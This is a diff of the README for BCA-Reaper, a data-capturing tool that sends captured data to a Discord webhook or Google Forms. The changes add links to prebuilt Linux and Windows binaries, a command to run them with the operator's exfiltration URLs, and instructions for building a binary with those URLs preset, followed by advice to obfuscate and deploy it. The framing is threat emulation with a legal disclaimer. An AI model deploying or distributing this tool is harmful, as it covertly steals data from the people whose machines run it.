@@ -15,11 +15,14 @@ an embedded script that executes PyInstaller.
 
 All captured data is exfiltrated to a **Discord** server and/or **Google Forms** instance through HTTPS.
 
+Linux and Windows binaries are [available](https://github.com/EONRaider/BCA-Reaper/tree/master/dist) 
+for portability and ease of execution.
+
 ## Demo
 ![demo]()
 
 ## Setup and Build
-The only requirements to set up and build are (I) a free Discord server and/or a suitable 
+The only requirements to set up and build are (I) a free Discord server and/or a 
 Google Forms instance and (II) building the binary with the URLs as arguments.
 
 ### I. Set up a Discord server and/or Google Forms instance
@@ -36,9 +39,20 @@ exfiltration works as long as the answer field for the first question is of type
 
   ![forms_setup](https://github.com/EONRaider/static/blob/9842916f424823ae8d72f8cd0e73a66371b9bcc7/reaper/forms_setup.png)
 
-### II. Build the binary
-*You need to install all dependencies before building*. Dependency management works 
-with both [Poetry](https://python-poetry.org/) (recommended) and [Virtualenv](https://virtualenv.pypa.io/en/latest/). 
+### II. Execute
+[Download the binaries for Linux/Unix or Windows systems](https://github.com/EONRaider/BCA-Reaper/tree/master/dist) 
+from the dist directory and run them with the URLs of your Discord server or Google Forms instance.
+```shell
+./linux_reaper --webhook YOUR-WEBHOOK-URL --forms YOUR-FORM-URL
+```
+The same procedure works for the Windows binary.
+
+### III. (Optional) Build your own binary
+What if you need a binary ready to exfiltrate to your own **preset Discord and 
+GoogleForms URLs** without setting them from the command line?
+
+Building the binary allows you to do just that. You just need to install all dependencies and build. 
+Dependency management works with both [Poetry](https://python-poetry.org/) (recommended) and [Virtualenv](https://virtualenv.pypa.io/en/latest/). 
 ```shell
 git clone https://github.com/EONRaider/BCA-Reaper.git
 cd BCA-Reaper
@@ -49,8 +63,8 @@ With all dependencies in place the `build.py` file takes care of the rest.
 ```shell
 python build.py --webhook YOUR-WEBHOOK-URL --forms YOUR-FORM-URL
 ```
-The result is a binary file named `reaper` that is ready for execution. Optionally 
-obfuscate and deploy in accordance with your threat emulation activity's ROE. Refer 
+The result is a binary file named `OS-NAME_reaper` that is ready to exfiltrate to your preset URLs 
+on execution. Optionally obfuscate and deploy in accordance with your threat emulation activity's ROE. Refer 
 to the [Legal Disclaimer](https://github.com/EONRaider/BCA-Reaper/tree/master#legal-disclaimer) 
 below.
 
@@ -71,16 +85,6 @@ optional arguments:
                         Time in seconds to wait between periodic executions of the exfiltration 
                         of logged data. Defaults to 30 seconds. Set to None to perform a 
                         single operation.
-```
-
-## Development mode (optional)
-You could optionally run Reaper directly from a local Python 3 interpreter. 
-[Install all dependencies](https://github.com/EONRaider/BCA-Reaper/tree/master#i-install-dependencies) 
-and run the `src/reaper.py` file with the required arguments for the Discord Webhook 
-and/or Google Forms URLs.
-
-```shell
-python reaper.py --webhook YOUR-WEBHOOK-URL --forms YOUR-GOOGLE-FORMS-URL
 ```
 
 ## Legal Disclaimer
